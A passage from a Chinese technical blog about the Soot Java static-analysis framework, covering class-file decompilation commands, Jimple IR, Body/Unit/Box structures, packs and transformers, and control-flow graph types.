<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp soot-<span class="number">4.2</span><span class="number">.1</span>.jar soot.Main -cp . -f J -pp Hello</span><br></pre></td></tr></table></figure>

<p>名为Hello.jimple的文件应包含：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        Hello r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@this</span>: Hello;</span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        java.lang.String[] r0;</span><br><span class="line">        java.io.PrintStream $r1;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@parameter</span>0: java.lang.String[];</span><br><span class="line">        $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;;</span><br><span class="line">        virtualinvoke $r1.&lt;java.io.PrintStream: <span class="function"><span class="keyword">void</span> <span class="title">println</span><span class="params">(java.lang.String)</span>&gt;<span class="params">(<span class="string">"Hello world!"</span>)</span></span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="例子：为Java基础类库生成baf文件"><a href="#例子：为Java基础类库生成baf文件" class="headerlink" title="例子：为Java基础类库生成baf文件"></a>例子：为Java基础类库生成baf文件</h1><p>接下来尝试为任何类文件生成.b，.baf，.jimp，.jimple，.grimp和.grimple文件。一个特别好的测试是JDK库中的类文件。所以像这样的命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp soot-<span class="number">4.2</span><span class="number">.1</span>.jar soot.Main -cp . -f baf -pp java.lang.String</span><br></pre></td></tr></table></figure>

<p>应该会产生一个文件java.lang.String.baf，其中包含以下格式的文本：</p>
<p><img src="../images/soot-%E5%A6%82%E4%BD%95%E5%8F%8D%E7%BC%96%E8%AF%91%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200719163210595.png" alt="image-20200719163210595"></p>
<h1 id="输出java文件"><a href="#输出java文件" class="headerlink" title="输出java文件"></a>输出java文件</h1><p>Soot不仅可以产生<code>.jimple</code>文件还可以产生<code>.java</code>文件。如果<code>–f dava</code>用于反编译为Java，请确保该文件<code>/lib/jce.jar</code>位于Soot的类路径中。</p>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp soot-<span class="number">4.2</span><span class="number">.1</span>.jar soot.Main -cp . -f d  -pp lll</span><br></pre></td></tr></table></figure>

<p>该文件下有一个lll.class文件,直接选择<code>-f d</code>，将其变为java文件：</p>
<p><img src="../images/soot-%E5%A6%82%E4%BD%95%E5%8F%8D%E7%BC%96%E8%AF%91%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200719163643401.png" alt="image-20200719163643401"></p>
<p>lll.java代码如下：</p>
<p><img src="../images/soot-%E5%A6%82%E4%BD%95%E5%8F%8D%E7%BC%96%E8%AF%91%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200719163715708.png" alt="image-20200719163715708"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Soot</tag>
      </tags>
  </entry>
  <entry>
    <title>Soot知识点整理</title>
    <url>/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>江山留胜迹，我辈复登临。</p>
</blockquote>
<p>兜兜转转好几圈，发现还是用soot的人多。借此机会，再跟一遍<a href="https://github.com/soot-oss/soot/wiki/Tutorials" target="_blank" rel="noopener">tutorials</a>，写点我自己的理解。</p>
<p>同步项目：<a href="https://github.com/0range228/MySootScript" target="_blank" rel="noopener">MySootScript</a></p>
<a id="more"></a>

<h1 id="SSA"><a href="#SSA" class="headerlink" title="SSA"></a>SSA</h1><p><strong>SSA</strong> 是static single assignment 的缩写，也就是<strong>静态</strong>单赋值形式。 顾名思义，就是每个变量只赋值一次。</p>
<h1 id="soot配置选项"><a href="#soot配置选项" class="headerlink" title="soot配置选项"></a>soot配置选项</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Options.v().set_output_format(Options.output_format_jimple);<span class="comment">//输出的形式</span></span><br><span class="line">Options.v().set_output_dir(<span class="string">"sootOutput"</span>);<span class="comment">//输出目录</span></span><br><span class="line">Options.v().set_whole_program(<span class="keyword">true</span>);<span class="comment">//全程序分析</span></span><br><span class="line">Options.v().set_verbose(<span class="keyword">true</span>);<span class="comment">//显示详细信息</span></span><br><span class="line">PackManager.v().writeOutput(); <span class="comment">//关键：启动输出。（不运行此语句不会进行输出）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Options.v().set_no_bodies_for_excluded(<span class="keyword">true</span>);<span class="comment">//不加载被排除的类 /callgraph边会减少很多</span></span><br><span class="line">Options.v().set_allow_phantom_refs(<span class="keyword">true</span>);<span class="comment">//找不到对应的源代码就被称作是虚类（phantom class） 允许虚类存在 不报错</span></span><br><span class="line">Options.v().set_process_dir(Collections.singletonList(apkPath));<span class="comment">//处理所有在dir中发现的类</span></span><br><span class="line">Options.v().setPhaseOption(“cg.spark”, “on”);<span class="comment">//开启SPARK分析CallGraph</span></span><br></pre></td></tr></table></figure>











<h1 id="soot的基本数据结构"><a href="#soot的基本数据结构" class="headerlink" title="soot的基本数据结构"></a>soot的基本数据结构</h1><p>soot有一个很复杂的层次结构，比如Scene，SootClass，SootClass，SootMethod，Body，Local，Trap，Unit；</p>
<p>Scene：</p>
<p>表示整个分析所发生的环境。</p>
<p>通过Scene可以设置提供给soot分析的所有的应用类、包含main方法的类和有关过程间分析的访问信息。</p>
<p>SootClass：</p>
<p>表示装入到soot中或者由soot创建的单个类。</p>
<p>在Scene中的各个类都是由SootClass类的实例表示的。</p>
<p>一个SootClass包含一个Java类所有相关的信息，例如这个类的类名、修饰符、父类、SootField、SootMethod链等。</p>
<p>SootField：</p>
<p>表示类的属性，也可以叫做域。</p>
<p>SootMethod：</p>
<p>表示一个类中的单个方法。</p>
<p>Body：</p>
<p>Body接口用来表示方法的实现。</p>
<p>在soot中，一个Body隶属于一个SootMethod，即soot用一个Body为一个方法存储代码。</p>
<p>分析应用可以使用Body访问各种信息，如一组声明的局部变量、方法体内语句、以及方法体内处理的异常。</p>
<p>Chain：</p>
<p>链。</p>
<p>每个Body里面有三个主链，分别是Units链、Locals链、Traps链。</p>
<p>Units：方法体内的语句。</p>
<p>Locals：方法内的局部变量。</p>
<p>Traps：方法内的异常处理。</p>
<p>四种Body：</p>
<p>BafBody、JimpleBody、ShimpleBody、GrimpBody，分别对应四种不同的中间表示法。</p>
<p>JimpleBody用得最多。</p>
<p>4种IR</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210324104136273.png" alt="image-20210324104136273"></p>
<h1 id="主流IR-Jimple"><a href="#主流IR-Jimple" class="headerlink" title="主流IR Jimple"></a>主流IR Jimple</h1><ol>
<li><p>基于栈</p>
<p>java语言的字节码表示本来就是栈的，而象Dalvik 是基于寄存器的，在这点上Jimple基于栈</p>
</li>
<li><p>有类型</p>
<p>每一个参数都定义了Type，并且类型精度没有丢失，比如int $i0</p>
</li>
<li><p>基于三地址分析</p>
<p>三地址解析中会出现很多的中间变量</p>
<p>三地址同时会拆解一些高级特性，被分解成多个单位，包含一些低级操作，支持低端指令一般而言，三地址代码将包含大部分低级操作，即目标机所支持的指令。</p>
</li>
</ol>
<p>此图<a href="https://blog.csdn.net/raintungli/article/details/101445822?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161663537516780271563057%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161663537516780271563057&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-3-101445822.pc_v1_rank_blog_v1&utm_term=soot" target="_blank" rel="noopener">参考</a></p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325093439720.png" alt="image-20210325093439720"></p>
<p>在body中有Units，Values，Traps，接下来细说。</p>
<p>Unit语句在Jimple中就是Stmt。</p>
<p>例如赋值语句：</p>
<p>AssignStmt：x=y+z</p>
<p>##Jimple 语句类型</p>
<p>核心语句：NopStmt，IdentityStmt，AssignStmt</p>
<p>负责过程内控制流</p>
<p>IfStmt , GotoStmt , SwitchStmt</p>
<p>负责过程间的控制流：</p>
<p>InvokeStmt ,ReturnStmt,ReturnVoidStmt., ThrowStmt</p>
<p>监控语句：MonitorStmt</p>
<p>赋值语句：DefinitionStmt</p>
<p>其它类型：NopStmt, BreakponitStmt</p>
<p>已经不使用的语句RetStmt</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210324104437621.png" alt="image-20210324104437621"></p>
<p>Soot为中间代码的翻译建立了一系列的基础设施。</p>
<p><code>AbstractStmtSwitch</code></p>
<p><code>soot.jimple.AbstractJimpleValueSwitch</code></p>
<p>等等还有很多switch，他们都是针对不同的语句进行了很多情况的分析。</p>
<p><strong>AssignStmt表示赋值语句；而IdentityStmt表示将参数赋值给Local这样的语句。</strong></p>
<h2 id="Value-amp-Box"><a href="#Value-amp-Box" class="headerlink" title="Value&amp;Box"></a>Value&amp;Box</h2><p>Value：</p>
<ul>
<li>Locals</li>
<li>Constants</li>
<li>Expression（Expr）</li>
<li>parameterRef，CaughtExceptionRef，ThisRef</li>
</ul>
<p>这里讲一下Expr接口，他又有一系列的实现，例如NewExpr和AddExpr。</p>
<p>一般来说，一个Expr可以对若干个Value进行一些操作并且返回另一个Value；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">x = y + <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>上面这是AssignStmt，他的leftOp是x，rightOp是一个AddExpr（y+2）</p>
<p>AddExpr又包含了值y和2作为操作数，前者是一个局部变量，而后者是一个常量。</p>
<p>在Jimple中，我们强制要求所有的Value<strong>最多包含一个表达式</strong>。</p>
<p>Box：</p>
<p>Box是指针！！！！！提供了对Soot对象的间接访问。一个Box提供了一个间接访问soot (Unit,Value)的入口，类似于Java的一个引用，当Unit包含另一个Unit的时候，需要通过Box来访问，Soot 里提供了两种类型的Box, 一个是ValueBox一个是UnitBox。</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325104642746.png" alt="image-20210325104642746"></p>
<p>上图可以看出来：</p>
<ul>
<li><strong>一个Unit有多个UnitBox，但是每个UnitBox只能指向一个Unit</strong>。GotoStmt 需要知道目标的Unit是什么，所以一个Unit会包含其它的UnitBox，通过 UnitBox获取下一个Unit。</li>
<li><strong>一个Value可以对应多个ValueBox，但是一个ValueBox只能对应一个Value</strong>，对于一个Unit，可以得到很多个ValueBox，包含着这条语句内部的所用到和所定义的语句。</li>
</ul>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325213104028.png" alt="image-20210325213104028"></p>
<p>两种Box：</p>
<ul>
<li>ValueBox，指向Values<ul>
<li>对于一条Unit来说，他的ValueBox存储的是在这条语句内部所<strong>用到</strong>的和<strong>所定义</strong>的语句。</li>
</ul>
</li>
<li>UnitBox，指向Units<ul>
<li>以goto语句为例，UnitBox其实存的就是goto所指的下一跳节点。</li>
<li>switch语句，则会包含很多boxes</li>
</ul>
</li>
</ul>
<p>i1=0 等于是一个Stmt,  i1是一个Valuebox，里面包含这i0这个local 的value。</p>
<p>多说几句：</p>
<p>DefBox是什么？</p>
<p>List defBoxes = ut.getDefBoxes();</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210429202819731.png" alt="image-20210429202819731"></p>
<p>举例常量叠加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a  = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> c = a + b;</span><br><span class="line"><span class="keyword">return</span> c;</span><br></pre></td></tr></table></figure>

<p>由于a,b的值都是常量，需要叠加一下，当然这部分soot内部已经实现了：</p>
<p>对于<code>int c = a + b</code>来说，这句话是一个赋值语句，也就是<code>AssignStmt</code>，在这个赋值语句中，左边是Local，右边是AddExpr，他们都是Value类型。</p>
<p>下面算法的逻辑：</p>
<ol>
<li>对于这个AssignStmt来说，需要首先获取他的Boxes，这些Boxes里面包含了Value的指针。</li>
<li>遍历Boxes，cast为ValueBox，然后获取他的Value，如果是AddExpr的话，那就是我们想优化的。</li>
<li>对于AddExpr来说，获取他的左值和右值，也就是两个value。</li>
<li>如果都是常量IntConstant的话，那么就把他们的value加在一起。</li>
<li>重新给AssignStmt的box赋值，让他指向sum和的常量。</li>
</ol>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210323212112768.png" alt="image-20210323212112768"></p>
<p>对于Unit语句类型来说，必须包含的方法有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">getUseBoxes</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">getDefBoxes</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">getUseAndDefBoxes</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>这些方法会返回在这条Unit语句内部Use的，Define的，或者两者都看。会以List of ValueBox的形式返回。对于getUseBoxes()方法，将返回所有使用的值；这包括表达式及其组成部分。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">getUnitBoxes</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>上面这个方法会返回一个List （UnitBox），包含所有被这个方法所指向的Unit。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">getBoxesPointingToThis</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>上面这个方法会返回一个List（UnitBox），包含那些指向这个Unit的Unit语句。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">fallsThrough</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">branches</span><span class="params">()</span></span>; <span class="comment">//如：IfStmt、GotoStmt</span></span><br></pre></td></tr></table></figure>

<p>处理在某条语句之后的执行流有关。</p>
<p>第一个方法：如果执行可以顺利流到紧挨着的下一条语句，就会返回True；</p>
<p>第二个方法：如果执行可以继续流下去，但是并不会流到紧挨着的下一条语句，返回True。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">redirectJumpsToThisTo</span><span class="params">(Unit newLocation)</span></span>;</span><br></pre></td></tr></table></figure>

<p>上面这个方法会用<code>getBoxesPointingToThis</code>方法去改变所有曾经指向这个Unit的跳转，让他们都指向这个新的<code>newLocation</code>。</p>
<p>总结：</p>
<p>我们能够确定<strong>跳转到这个Unit的其他Unit</strong>（调用getBoxesPointingToThis()），也可以找到<strong>跳到的其他Unit</strong>（调用getUnitBoxes()）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title">getUseBoxes</span><span class="params">()</span></span>;<span class="comment">//返回Unit中使用的Value的引用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title">getDefBoxes</span><span class="params">()</span></span>;<span class="comment">//返回Unit中定义的Value的引用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title">getUseAndDefBox</span><span class="params">()</span></span>;<span class="comment">//返回Unit中定义并使用的Value的引用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">geUnitBoxes</span><span class="params">()</span></span>;<span class="comment">//获得被这个unit跳转到的UnitxBox的List</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List <span class="title">getBoxesPointingTothis</span><span class="params">()</span></span>;<span class="comment">//获得该unit作为跳转对象时，所有跳转本身的UnitBox</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">fallsThrough</span><span class="params">()</span></span>;<span class="comment">//如果接下来执行后面挨着的unit，则为true</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">branches</span><span class="params">()</span></span>;<span class="comment">//如果执行时会跳转到其他别的unit，则返回true。如：IfStmt、GotoStmt</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rediectJumpsToThisTo</span><span class="params">(Unit newLocation)</span></span>;<span class="comment">//该方法把跳转到该unit重定向到newLocation</span></span><br></pre></td></tr></table></figure>



<h1 id="处理阶段Pack-Transformer"><a href="#处理阶段Pack-Transformer" class="headerlink" title="处理阶段Pack/Transformer"></a>处理阶段Pack/Transformer</h1><p><strong>程序内分析</strong>：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325112408646.png" alt="image-20210325112408646"></p>
<p>上面这张图是<strong>程序内分析</strong>大致框架图，入口点是Jimple，用户可以在转化阶段加入一些分析相关的信息。这个可以在<strong>jtp（Jimple Transformation pack）</strong>阶段来实现。</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PackManager.v().getPack(<span class="string">"jtp"</span>).add(<span class="keyword">new</span> Transform(<span class="string">"jtp.myTransform"</span>, <span class="keyword">new</span> BodyTransformer()&#123;</span><br><span class="line"> </span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">internalTransform</span><span class="params">(Body b, String phaseName,</span></span></span><br><span class="line"><span class="function"><span class="params">			Map options)</span> </span>&#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">			...</span><br><span class="line">			</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码就是在jtp pack中插入小步骤myTransform，但soot的执行流执行完自定义的myTransform后，将继续沿着执行流执行，自定义的小步骤就像soot的一个插件，并不影响其他的执行流顺序。</p>
<p><strong>程序间分析</strong>：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325112426889.png" alt="image-20210325112426889"></p>
<p>第二张图是程序间程序分析</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PackManager.v().getPack(<span class="string">"wjtp"</span>).add(</span><br><span class="line">	<span class="keyword">new</span> Transform(<span class="string">"wjtp.myTransform"</span>, <span class="keyword">new</span> SceneTransformer() &#123;				</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">internalTransform</span><span class="params">(String arg0,</span></span></span><br><span class="line"><span class="function"><span class="params">		Map&lt;String, String&gt; arg1)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">						</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">					</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<p>上述代码就是在wjtp pack中插入一个小步骤myTransform。 但soot的执行流执行完自定义的myTransform后，将继续沿着执行流执行，自定义的小步骤就像soot的一个插件，并不影响其他的执行流顺序。</p>
<p>这里总结一下各个阶段的命名规则：</p>
<p>第一个字母表示中间代码种类：</p>
<ul>
<li>j=Jimple</li>
<li>s=Shimple</li>
<li>b=Baf</li>
<li>g=Grimp</li>
</ul>
<p>第二个字母表示该阶段做的事情：</p>
<ul>
<li>b=body 方法体创建阶段</li>
<li>t=transform 用户自定的创建阶段</li>
<li>o=optimizations 优化阶段</li>
<li>a=annotion 属性生成阶段</li>
</ul>
<p>最后的P：</p>
<ul>
<li>p=pack 处理阶段</li>
</ul>
<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325144633222.png" alt="image-20210325144633222" style="zoom:50%;">



<h2 id="核心阶段与小阶段"><a href="#核心阶段与小阶段" class="headerlink" title="核心阶段与小阶段"></a>核心阶段与小阶段</h2><p>在Soot的核心阶段分为PP-&gt;CG-&gt;TP-&gt;OP-&gt;AP，Soot支持多IR分析，但在核心过程中只支持Jimple, Shimple, 在Pack中可以插入自定义的Transform，这样就可以在每一个分析阶段加入自己的分析步骤，从而实现自定义分析的能力。</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325142641719.png" alt="image-20210325142641719"></p>
<p>但是一开始jb都是必须要做的，生成jimplebody，下图中，jb阶段就是核心阶段，下面罗列的就是小阶段：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325142908378.png" alt="image-20210325142908378"></p>
<p>具体每个小阶段是干嘛的，可以看<a href="https://soot-build.cs.uni-paderborn.de/public/origin/develop/soot/soot-develop/options/soot_options.htm" target="_blank" rel="noopener">这里</a></p>
<p>PP</p>
<p>Pre-processing Pack 是第一个分析的Pack,该Pack允许你自定义一些自己的transform在构建call graph之前。</p>
<p>CG</p>
<p>CG Call Graph，调用图，调用图是静态层序分析的关键，方法调用图包含着整个函数调用的关系图。</p>
<h2 id="body-packs"><a href="#body-packs" class="headerlink" title="body packs"></a>body packs</h2><p>Body Packs 基于Body 的Packs分析，对不同的IR有不同的Packs。</p>
<p>和前面的核心Packs不同的是，这里只是基于Body进行分析，每个Packs依然可以自己定义Transform，区别是使用不同的Transformer，在Body packs里使用的是BodyTransformer。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">internalTransform</span><span class="params">(Body b, String phaseName, Map&lt;String, String&gt; options)</span></span>;</span><br></pre></td></tr></table></figure>

<p>internalTransform里面包含了Body 对象</p>
<p>与核心的Pack分析不同的是，当分析到Body的Packs的时候，Soot会启动多线程进行Pack的分析。</p>
<p>在Soot里，每个阶段都又对应的pack来完成。</p>
<p>Pack其实具体来说就是一组变换器(Transformer)，每个变换器对应着相应的子阶段。</p>
<p>当Pack被调用时，它按照执行顺序执行每一个Tranformer。</p>
<p>提供拓展机制的是那些允许用户自定义变换的Pack：</p>
<ol>
<li>jtp：Jimple-transformation-pack</li>
<li>stp：Shimple-transformation-pack</li>
</ol>
<p>在不改变Soot自身的情况下，用户往往可以自定义满足需求的类（变换器），然后将其注入到这些pack中，之后调用soot.Main()，使其进入到Soot的正常流程调度中。</p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是Soot的变换器，允许用户自定义。</p>
<p>Soot变换器通常是继承两种：</p>
<ol>
<li>BodyTransformer：针对单个方法体，过程内，进行变换；</li>
<li>SceneTransformer：针对整个应用，过程间，进行变换。</li>
</ol>
<p>这两种方法下，变换器类都必须重构internalTransform方法，在这个方法里对被分析的代码执行某种变换。</p>
<p>你的transformer也可以分开写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PackManager.v().getPack(<span class="string">"jtp"</span>).add(<span class="keyword">new</span> Transform(<span class="string">"jtp.myAnalysis"</span>, <span class="keyword">new</span> MyAnalysis()));</span><br><span class="line">PackManager.v().runPacks();</span><br><span class="line">System.out.println(Scene.v().getCallGraph().size());</span><br><span class="line">PackManager.v().writeOutput();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//MyAnalysis.java文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAnalysis</span> <span class="keyword">extends</span> <span class="title">BodyTransformer</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">internalTransform</span><span class="params">(<span class="keyword">final</span> Body body,String phase, @SuppressWarnings(<span class="string">"rawtypes"</span>)</span>Map options)</span>&#123;      </span><br><span class="line">      <span class="keyword">for</span> (SootClass c:Scene.v().getApplicationClasses()) &#123;</span><br><span class="line">          System.out.println(<span class="string">"[sootClass]"</span>+c);</span><br><span class="line">        <span class="keyword">for</span>(SootMethod m:c.getMethods())</span><br><span class="line">        &#123;</span><br><span class="line">              System.out.println(<span class="string">"[sootMethod]"</span>+m);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(m.isConcrete())</span><br><span class="line">            &#123;</span><br><span class="line">                Body b=m.retrieveActiveBody();</span><br><span class="line">                  System.out.println(<span class="string">"[body]"</span>+b);</span><br><span class="line"></span><br><span class="line">                Iterator&lt;Unit&gt; i=b.getUnits().snapshotIterator();</span><br><span class="line">                <span class="keyword">while</span>(i.hasNext())</span><br><span class="line">                &#123;</span><br><span class="line">                    Unit u=i.next();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="控制流图-CFG"><a href="#控制流图-CFG" class="headerlink" title="控制流图 CFG"></a>控制流图 CFG</h1><p>soot有两种类型的控制流图(两个抽象类，均实现DirectedGraph接口)：</p>
<ul>
<li>UnitGraph</li>
<li>BlockGraph</li>
</ul>
<p>区别：</p>
<p>UnitGraph是语句图，结点是Units。</p>
<p>BlockGraph是基本控制流图，结点由基本块BasicBlocks组成。</p>
<p>共同点：</p>
<p>首先这两种类型图的表示是相通的。</p>
<p>该接口中的API们，可以获取到：</p>
<ul>
<li>图的入口节点和出口节点；</li>
<li>一个给定节点的前驱结点和后继结点；</li>
<li>一个以某种未明确规定的顺序和节点数在图中进行迭代的迭代器。</li>
<li>图的大小规模（节点数）</li>
</ul>
<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210328172341115.png" alt="image-20210328172341115" style="zoom:60%;">



<p>在这些基础上就可以开发对任意DirectedGraph有向图进行处理的方法。</p>
<p>实际上，UnitGraph和BlockGraph都是抽象类，Soot自己也实现很多实例化的子类。</p>
<p>例如CompleteUnitGraph、BriefUnitGraph、CompleteBlockGraph、BriefBlockGraph等。</p>
<p>具体在soot.toolkits.graph有实现说明。</p>
<p>继承实现关系</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210328220439227.png" alt="image-20210328220439227"></p>
<h2 id="语句图UnitGraph"><a href="#语句图UnitGraph" class="headerlink" title="语句图UnitGraph"></a>语句图UnitGraph</h2><p>巧妙之处：数据的关系与数据的内容进行了分离。</p>
<p>UnitGraph只是将Unit中的关系进行了保存，并不会改动Unit，Body的内容。</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325165632527.png" alt="image-20210325165632527"></p>
<p>soot中UnitGraph是一个抽象程度较高的语句图。</p>
<p>重点说一下UnitGraph：</p>
<p>UnitGraph的优点是简化了控制流图，<strong>没有了基本块的概念</strong>。</p>
<p>使用它可以简化传统的固定点数据流分析的实现。(fixed point data flow analysis)</p>
<p>但是缺点是由于没有了基本块，那么也就增加了分析时间的开销。</p>
<h3 id="UnitGraph的四个子类"><a href="#UnitGraph的四个子类" class="headerlink" title="UnitGraph的四个子类"></a>UnitGraph的四个子类</h3><p>继承UnitGraph的有4种：</p>
<ul>
<li>BriefUnitGraph 【用得最多】</li>
<li>EnhancedUnitGraph</li>
<li>ExceptionalUnitGraph</li>
<li>TrapUnitGraph</li>
</ul>
<p>API：</p>
<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325200427960.png" alt="image-20210325200427960" style="zoom:80%;">



<p>BriefUnitGraph：</p>
<p>【正常，异常分离】BriefUnitGraph将正常的流程，与异常的处理流程进行了分离。（不相交，在最后才进行汇聚）；不包含针对exception的边</p>
<p>ExceptionalUnitGraph：</p>
<p>【融合】将正常流程与异常流程进行了融合，而不再是分离的。包含exception的边</p>
<ul>
<li>包含从throw到catch的边，soot里面叫Trap</li>
<li>它还会计算语句中隐含的异常抛出</li>
<li>会有一条边从抛出异常那条语句的前驱节点指向异常处理的第一条语句Unit</li>
<li>如果包含异常的语句包含一些副作用，那么有副作用的边也会被添加到图里面</li>
</ul>
<p>TrapUnitGraph：</p>
